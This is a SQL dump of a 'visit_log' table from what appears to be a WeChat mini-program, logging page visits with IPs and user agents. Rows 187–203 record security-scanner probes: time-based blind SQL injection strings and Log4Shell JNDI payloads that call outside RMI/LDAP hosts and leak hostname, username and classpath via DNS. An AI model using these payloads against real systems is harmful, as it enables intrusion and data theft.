INSERT INTO `visit_log` VALUES (187, '43.139.209.119', '/pages/index/index\" AND (SELECT*FROM(SELECT(SLEEP(3)))qbin) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:08');
INSERT INTO `visit_log` VALUES (188, '43.139.209.119', '\" AND (SELECT*FROM(SELECT(SLEEP(3)))bnxg) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:08');
INSERT INTO `visit_log` VALUES (189, '43.139.209.119', '/pages/index/index\')) AND (SELECT*FROM(SELECT(SLEEP(3)))sibx) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:09');
INSERT INTO `visit_log` VALUES (190, '43.139.209.119', '\')) AND (SELECT*FROM(SELECT(SLEEP(4)))wdux) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:10');
INSERT INTO `visit_log` VALUES (191, '43.139.209.119', '/pages/index/index\") AND (SELECT*FROM(SELECT(SLEEP(4)))chxm) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:11');
INSERT INTO `visit_log` VALUES (192, '43.139.209.119', '\") AND (SELECT*FROM(SELECT(SLEEP(3)))ohip) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:11');
INSERT INTO `visit_log` VALUES (193, '43.139.209.119', '/pages/index/index\' AND (SELECT*FROM(SELECT(SLEEP(4)))fxor) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:12');
INSERT INTO `visit_log` VALUES (194, '43.139.209.119', '\' AND (SELECT*FROM(SELECT(SLEEP(3)))mark) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:12');
INSERT INTO `visit_log` VALUES (195, '43.139.209.119', '/pages/index/index\') AND (SELECT*FROM(SELECT(SLEEP(3)))bgwn) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:13');
INSERT INTO `visit_log` VALUES (196, '43.139.209.119', '\') AND (SELECT*FROM(SELECT(SLEEP(2)))krre) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:13');
INSERT INTO `visit_log` VALUES (197, '43.139.209.119', '/pages/index/index AND (SELECT*FROM(SELECT(SLEEP(3)))murs) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:14');
INSERT INTO `visit_log` VALUES (198, '43.139.209.119', ' AND (SELECT*FROM(SELECT(SLEEP(4)))xjar) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:14');
INSERT INTO `visit_log` VALUES (199, '43.139.209.119', '${jndi:rmi://183.47.120.213:1099/bypassd2fb45b79dd3bd4682d7838adfefa018-/-${hostName}}', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:17');
INSERT INTO `visit_log` VALUES (200, '43.139.209.119', '${jndi:ldap://183.47.120.213:1389/jdk18a50aa625c6ed7cb8ec9ebc921c824885-/-${hostName}}', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:18');
INSERT INTO `visit_log` VALUES (201, '43.139.209.119', '${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.08ba2c340818290b1bfedbd762b88867.4j2.mauu.mauu.me/}', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:18');
INSERT INTO `visit_log` VALUES (202, '43.139.209.119', '${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.1684d7b282446dee7fb1f049a68785f4.4j2.mauu.mauu.me/}', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:19');
INSERT INTO `visit_log` VALUES (203, '43.139.209.119', 'aaaa\'%bf%27', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:20');
INSERT INTO `visit_log` VALUES (204, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/155', 'mobile', '2025-09-02 00:41:43');
INSERT INTO `visit_log` VALUES (205, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 00:45:09');
INSERT INTO `visit_log` VALUES (206, '192.168.10.2', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 00:52:41');
INSERT INTO `visit_log` VALUES (207, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 00:53:06');
INSERT INTO `visit_log` VALUES (208, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 01:07:53');
INSERT INTO `visit_log` VALUES (209, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/176', 'mobile', '2025-09-02 01:12:53');
INSERT INTO `visit_log` VALUES (210, '192.168.10.2', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 01:17:54');
INSERT INTO `visit_log` VALUES (211, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/179', 'mobile', '2025-09-02 01:22:19');
INSERT INTO `visit_log` VALUES (212, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/180', 'mobile', '2025-09-02 01:34:21');
INSERT INTO `visit_log` VALUES (213, '192.168.10.6', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/182', 'mobile', '2025-09-02 01:44:11');
INSERT INTO `visit_log` VALUES (214, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/185', 'mobile', '2025-09-02 01:47:37');
INSERT INTO `visit_log` VALUES (215, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/189', 'mobile', '2025-09-02 01:54:16');
INSERT INTO `visit_log` VALUES (216, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/193', 'mobile', '2025-09-02 01:59:30');
INSERT INTO `visit_log` VALUES (217, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/195', 'mobile', '2025-09-02 02:05:01');
INSERT INTO `visit_log` VALUES (218, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/203', 'mobile', '2025-09-02 02:12:38');
INSERT INTO `visit_log` VALUES (219, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/205', 'mobile', '2025-09-02 02:18:59');
INSERT INTO `visit_log` VALUES (220, '124.221.213.176', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 02:28:24');
INSERT INTO `visit_log` VALUES (221, '101.34.86.201', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 02:28:25');
INSERT INTO `visit_log` VALUES (222, '124.221.213.176', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 02:28:38');
INSERT INTO `visit_log` VALUES (223, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 02:34:23');
INSERT INTO `visit_log` VALUES (224, '124.220.124.244', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 02:38:24');
INSERT INTO `visit_log` VALUES (225, '124.220.124.244', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 02:39:12');
INSERT INTO `visit_log` VALUES (226, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 02:43:12');
INSERT INTO `visit_log` VALUES (227, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/211', 'mobile', '2025-09-02 02:48:41');
INSERT INTO `visit_log` VALUES (228, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/214', 'mobile', '2025-09-02 02:55:22');
INSERT INTO `visit_log` VALUES (229, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/220', 'mobile', '2025-09-02 03:02:41');
INSERT INTO `visit_log` VALUES (230, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/222', 'mobile', '2025-09-02 03:07:49');
INSERT INTO `visit_log` VALUES (231, '124.221.213.176', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:11:30');
INSERT INTO `visit_log` VALUES (232, '124.220.124.244', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:11:32');
INSERT INTO `visit_log` VALUES (233, '101.34.86.201', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:11:34');
INSERT INTO `visit_log` VALUES (234, '101.34.86.201', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:11:47');
INSERT INTO `visit_log` VALUES (235, '124.221.213.176', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:12:19');
INSERT INTO `visit_log` VALUES (236, '124.220.124.244', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:12:21');
INSERT INTO `visit_log` VALUES (237, '39.163.100.200', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 03:12:26');
INSERT INTO `visit_log` VALUES (238, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/223', 'mobile', '2025-09-02 03:13:28');
INSERT INTO `visit_log` VALUES (239, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 03:19:27');
INSERT INTO `visit_log` VALUES (240, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 03:24:37');
INSERT INTO `visit_log` VALUES (241, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 03:35:20');
INSERT INTO `visit_log` VALUES (242, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 03:40:22');
INSERT INTO `visit_log` VALUES (243, '124.220.124.244', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:43:26');
INSERT INTO `visit_log` VALUES (244, '124.221.213.176', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:43:26');
INSERT INTO `visit_log` VALUES (245, '124.221.213.176', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:43:41');
INSERT INTO `visit_log` VALUES (246, '124.220.124.244', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 03:44:14');
INSERT INTO `visit_log` VALUES (247, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 03:47:56');
INSERT INTO `visit_log` VALUES (248, '39.163.100.55', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/1', 'mobile', '2025-09-02 14:46:11');
INSERT INTO `visit_log` VALUES (249, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/2', 'mobile', '2025-09-02 14:52:43');
INSERT INTO `visit_log` VALUES (250, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/3', 'mobile', '2025-09-02 15:11:08');
INSERT INTO `visit_log` VALUES (251, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/5', 'mobile', '2025-09-02 15:17:02');
INSERT INTO `visit_log` VALUES (252, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 16:58:42');
INSERT INTO `visit_log` VALUES (253, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 17:12:07');
INSERT INTO `visit_log` VALUES (254, '39.163.100.55', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-02 22:19:52');
INSERT INTO `visit_log` VALUES (255, '42.233.175.105', '/pages/index/index', '', 'Mozilla/5.0 (Linux; Android 15; ELP-AN00 Build/HONORELP-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380143 MMWEBSDK/20250802 MMWEBID/2466 MicroMessenger/8.0.62.2900(0x28003E57) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android', 'mobile', '2025-09-02 22:25:12');
INSERT INTO `visit_log` VALUES (256, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-02 23:50:49');
INSERT INTO `visit_log` VALUES (257, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/55', 'mobile', '2025-09-03 00:46:54');
INSERT INTO `visit_log` VALUES (258, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/56', 'mobile', '2025-09-03 01:19:22');
INSERT INTO `visit_log` VALUES (259, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/77', 'mobile', '2025-09-03 01:31:01');
INSERT INTO `visit_log` VALUES (260, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/80', 'mobile', '2025-09-03 01:36:04');
INSERT INTO `visit_log` VALUES (261, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/82', 'mobile', '2025-09-03 01:41:52');
INSERT INTO `visit_log` VALUES (262, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/83', 'mobile', '2025-09-03 01:49:58');
INSERT INTO `visit_log` VALUES (263, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-03 01:56:18');
INSERT INTO `visit_log` VALUES (264, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-03 02:03:12');
INSERT INTO `visit_log` VALUES (265, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/86', 'mobile', '2025-09-03 02:32:21');
